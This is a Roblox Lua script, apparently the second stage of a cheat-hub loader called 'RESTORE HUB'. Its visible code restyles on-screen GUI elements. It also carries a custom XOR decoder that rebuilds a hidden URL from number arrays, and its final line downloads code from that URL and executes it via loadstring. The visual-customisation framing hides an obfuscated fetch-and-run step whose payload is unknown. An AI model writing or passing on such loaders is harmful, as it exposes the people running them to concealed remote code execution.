
--[[ STAGE 2: VISUAL CORE ]]
local YE3cEL6Nw9GuA_ = bit32 and bit32.bxor
if not YE3cEL6Nw9GuA_ then
    YE3cEL6Nw9GuA_ = function(a, b)
        local r, m = 0, 1
        while a > 0 or b > 0 do
            local aa = a % 2
            local bb = b % 2
            if aa ~= bb then r = r + m end
            a = (a - aa) / 2
            b = (b - bb) / 2
            m = m * 2
        end
        return r
    end
end
local function W4QJ_5JaICWy(data, a, b, m, s, r, z)
    local out = {}
    for i = 1, #data do
        local v = data[i]
        local drift = (b + i * s + (z or 0)) % 256
        if m == 0 then
            v = (v - drift) % 256
            v = YE3cEL6Nw9GuA_(v, a)
        else
            v = YE3cEL6Nw9GuA_(v, a)
            v = (v - drift) % 256
        end
        out[i] = string.char(v)
    end
    local res = table.concat(out)
    if r then
        res = string.reverse(res)
    end
    return res
end
local _bmKPncvbHf88kwZpjG1gl = {
  {{164, 154, 210, 210}, 21, 104, 0, 1, true, 2, 1},
  {{120, 100, 102, 162}, 212, 44, 1, 3, true, 8, 15},
  {{206, 206, 163, 167, 168}, 106, 133, 0, 4, true, 18, 12},
  {{7, 30, 15, 20, 17, 27}, 51, 159, 0, 4, false, 14, 30},
  {{212, 206, 237, 181}, 17, 72, 0, 6, true, 23, 22},
  {{156, 234, 236, 249, 242, 254, 192}, 44, 63, 1, 7, true, 5, 7},
  {{36, 41, 19, 38, 21}, 49, 161, 1, 4, false, 6, 1},
  {{92, 100, 84, 66, 90, 55}, 119, 164, 1, 4, true, 19, 20},
  {{143, 115, 115}, 152, 165, 1, 3, true, 22, 13},
  {{178, 216, 234, 221, 183}, 19, 106, 0, 1, false, 3, 11},
  {{102, 96, 106, 104}, 86, 34, 0, 2, true, 9, 7},
  {{144, 237, 157, 251, 165, 14, 15}, 59, 113, 0, 7, true, 21, 15},
  {{40, 111, 49, 34, 221}, 220, 94, 1, 5, false, 7, 29},
  {{21, 14, 236, 247, 247}, 175, 26, 0, 3, false, 15, 8},
  {{252, 28, 28}, 84, 208, 0, 3, true, 16, 9},
  {{18, 174, 174, 211, 188, 251, 181}, 108, 44, 1, 5, true, 12, 30},
  {{221, 232, 247, 228}, 242, 64, 0, 3, true, 17, 1},
  {{217, 215, 201}, 225, 186, 1, 1, false, 20, 8},
  {{219, 192, 207, 222}, 49, 64, 0, 2, false, 13, 27},
  {{173, 171, 156, 187, 182, 191}, 245, 13, 0, 3, true, 11, 4},
  {{163, 176, 182, 181}, 142, 165, 1, 5, true, 4, 27},
  {{209, 46, 55}, 39, 117, 1, 7, false, 1, 18},
  {{220, 171, 151, 219, 193, 195, 197}, 156, 173, 1, 7, true, 10, 26}
}
local MYG853_OxBlwYp = {}
for luecjzd_KBNNnf2VNi5RBe = 1, #_bmKPncvbHf88kwZpjG1gl do
    local W9IxEg4Ju3gnFAy6Nu = _bmKPncvbHf88kwZpjG1gl[luecjzd_KBNNnf2VNi5RBe]
    MYG853_OxBlwYp[W9IxEg4Ju3gnFAy6Nu[7]] = W4QJ_5JaICWy(
        W9IxEg4Ju3gnFAy6Nu[1],
        W9IxEg4Ju3gnFAy6Nu[2],
        W9IxEg4Ju3gnFAy6Nu[3],
        W9IxEg4Ju3gnFAy6Nu[4],
        W9IxEg4Ju3gnFAy6Nu[5],
        W9IxEg4Ju3gnFAy6Nu[6],
        W9IxEg4Ju3gnFAy6Nu[8]
    )
end
local HAEudOehFmg1 = table.concat(MYG853_OxBlwYp)
local HubName = "RESTORE HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(HAEudOehFmg1))()
